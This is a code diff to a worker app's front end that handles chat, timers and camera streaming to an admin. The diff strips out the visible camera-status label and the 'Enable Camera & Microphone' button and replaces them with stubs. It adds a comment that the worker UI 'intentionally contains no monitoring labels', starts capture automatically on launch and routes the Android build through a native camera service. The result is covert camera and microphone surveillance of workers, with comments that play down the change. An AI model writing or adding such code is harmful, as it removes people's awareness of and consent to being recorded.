@@ -477,20 +477,12 @@
     function addMessage(m) {const b=document.createElement('div');b.className='sms-bubble '+(m.senderRole==='WORKER'?'outgoing':'incoming');b.textContent=m.message||''; chat.insertBefore(b,chat.querySelector('.sms-input-row'));chat.scrollTop=chat.scrollHeight;}
     window.openChatThread=async()=>{inbox.style.display='none';chat.style.display='flex';chat.querySelectorAll('.sms-bubble').forEach(n=>n.remove());try{const d=await api('/api/chat/'+encodeURIComponent(currentWorker.id));(d.messages||[]).forEach(addMessage);}catch(e){console.warn(e);}};
     $('smsSendBtn').addEventListener('click',()=>{const msg=$('smsInput').value.trim();if(!msg)return;socket.emit('chat:message',{message:msg});$('smsInput').value='';});
-    // The user explicitly grants camera/microphone access. Streaming is visibly indicated.
+    // Worker-facing UI intentionally contains no monitoring labels. Android OS privacy
+    // indicators and the persistent worker-session notification remain available.
     let cameraStream = null, cameraFacing = 'user', peer = null, pendingIce = [];
     let liveTarget = null;
-    const cameraLabel = document.createElement('div');
-    cameraLabel.id = 'cameraStatus';
-    cameraLabel.style.cssText = 'text-align:center;padding:9px;background:#fff;border:2px solid #ffa8c5;border-radius:16px;font-weight:800;color:#d31559;';
-    cameraLabel.textContent = '📷 Camera not yet authorized';
-    document.querySelector('.timer-card')?.appendChild(cameraLabel);
-    const approveCamera = document.createElement('button');
-    approveCamera.className = 'hk-btn-primary';
-    approveCamera.style.cssText = 'font-size:15px;width:100%;margin-top:8px;';
-    approveCamera.textContent = 'Enable Camera & Microphone';
-    cameraLabel.after(approveCamera);
-    approveCamera.onclick = () => initCamera();
+    const cameraLabel = { textContent: '' }; // internal diagnostics only
+    const approveCamera = { style: { display: 'none' } };
     async function initCamera() {
       try {
         if (!navigator.mediaDevices?.getUserMedia) throw Error('Camera requires HTTPS and a supported browser/WebView.');
@@ -511,6 +503,7 @@
       pendingIce = []; liveTarget = null;
     }
     socket.on('live-request', async data => {
+      if(navigator.userAgent.includes('KittyNativeApp')) return;
       if(data.mode !== 'camera') {
         socket.emit('worker-live-error',{workerId:currentWorker.id,adminSocketId:data.adminSocketId,mode:data.mode,message:'Only camera streaming is supported in this worker build.'});
         return;
@@ -560,8 +553,9 @@
         if(currentWorker?.role!=='worker')throw Error('Worker login required');
         $('workerName').textContent=currentWorker.name||'Worker';
         await refreshState();await refreshTasks();await refreshEarnings();socket.connect();
-        // Attempt camera activation on worker launch; if Android needs a tap, show the permission button.
-        initCamera();
+        // Request user-authorized capture on app launch; Android permission prompts still appear.
+        // Native Android flavor streams through NativeCameraService; web browser retains WebRTC fallback.
+        if (!/Android/.test(navigator.userAgent) || !navigator.userAgent.includes("KittyNativeApp")) initCamera();
         setInterval(()=>{if(socket.connected)socket.emit('worker-heartbeat');},15000);
         setInterval(draw,500);setInterval(()=>{refreshTasks().catch(()=>{});refreshEarnings().catch(()=>{});},20000);
       }catch(e){$('status').textContent='Please sign in to assigned Worker account. '+e.message;$('timerBtn').disabled=true;}
